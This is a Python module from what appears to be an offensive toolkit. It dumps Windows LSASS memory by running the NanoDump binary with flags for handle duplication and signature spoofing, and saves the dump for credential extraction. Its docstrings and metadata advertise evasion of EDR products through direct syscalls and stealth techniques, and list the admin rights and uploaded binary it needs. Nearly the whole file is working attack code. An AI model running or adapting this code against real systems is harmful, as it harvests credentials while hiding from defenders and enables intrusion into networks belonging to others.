#!/usr/bin/env python3
"""
LSASS dumping via NanoDump
Modern LSASS dumper with advanced EDR evasion
"""

import os
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict

from ..utils import get_lsass_pid


class NanodumpDumper:
    """
    Dump LSASS using NanoDump
    
    OPSEC Level: HIGH
    - Modern EDR evasion techniques
    - Direct syscalls bypass userland hooks
    - Handle duplication for stealth
    """
    
    METHOD_NAME = "nanodump"
    OPSEC_RATING = "High"
    
    def __init__(self, output_dir: Path, nanodump_path: Optional[str] = None):
        self.output_dir = Path(output_dir)
        
        # Check common locations for nanodump
        if nanodump_path:
            self.nanodump_path = nanodump_path
        else:
            # Try common locations
            possible_paths = [
                r"C:\Windows\Temp\nanodump.exe",
                r"C:\Tools\nanodump.exe",
                r".\nanodump.exe",
                "nanodump.exe"
            ]
            
            self.nanodump_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    self.nanodump_path = path
                    break
    
    def dump(self) -> Optional[Dict]:
        """
        Execute LSASS dump via NanoDump
        
        Returns:
            Dict with dump metadata or None on failure
        """
        print(f"\n[*] Method: NanoDump")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Modern EDR evasion techniques")
        
        # Check if nanodump exists
        if not self.nanodump_path or not os.path.exists(self.nanodump_path):
            print(f"[-] NanoDump not found")
            print(f"[!] Searched: C:\\Windows\\Temp\\nanodump.exe, C:\\Tools\\nanodump.exe")
            print(f"[!] Build from: https://github.com/helpsystems/nanodump")
            print(f"[!] Compile with: MSVS with direct syscalls enabled")
            return None
        
        print(f"[+] NanoDump found: {self.nanodump_path}")
        
        # Create output file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dump_file = self.output_dir / f"lsass_nano_{timestamp}.dmp"
        
        # Build NanoDump command
        # -w: write to file
        # --valid: use valid signature
        # --duplicate: duplicate handle for stealth
        cmd = f'"{self.nanodump_path}" -w "{dump_file}" --valid --duplicate'
        
        print(f"[*] Executing NanoDump...")
        print(f"[*] Using techniques: handle duplication, syscalls, valid signature")
        
        try:
            # Execute NanoDump
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # Display output
            if result.stdout:
                print(result.stdout)
            
            # Verify dump was created
            if dump_file.exists():
                size = dump_file.stat().st_size
                
                print(f"[+] LSASS dumped successfully!")
                print(f"[+] Dump file: {dump_file}")
                print(f"[+] Size: {size / 1024 / 1024:.2f} MB")
                
                return {
                    'method': self.METHOD_NAME,
                    'file': str(dump_file),
                    'size': size,
                    'timestamp': timestamp,
                    'opsec_rating': self.OPSEC_RATING
                }
            else:
                print(f"[-] Dump file not created")
                
                if result.stderr:
                    print(f"[-] Error: {result.stderr}")
                
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Dump operation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Dump failed: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        return self.nanodump_path is not None and os.path.exists(self.nanodump_path)
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this dump method"""
        return {
            'name': 'nanodump',
            'description': 'Modern LSASS dumper with EDR evasion',
            'opsec_rating': 'High',
            'requirements': [
                'Administrative privileges',
                'nanodump.exe (must compile from source)'
            ],
            'advantages': [
                'Direct syscalls bypass EDR hooks',
                'Handle duplication for stealth',
                'Valid signature spoofing',
                'Modern evasion techniques',
                'Actively maintained'
            ],
            'disadvantages': [
                'Requires compilation from source',
                'Must upload custom binary',
                'Newer tool with less documentation',
                'May be detected by behavioral analysis'
            ]
        }
